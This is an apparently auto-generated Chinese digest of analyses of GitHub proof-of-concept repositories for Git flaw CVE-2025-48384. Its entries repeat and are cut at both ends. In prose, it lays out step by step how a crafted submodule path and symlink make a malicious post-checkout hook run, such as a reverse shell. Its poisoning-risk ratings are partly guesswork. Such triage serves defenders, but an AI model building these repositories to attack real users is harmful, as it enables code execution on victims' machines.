**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

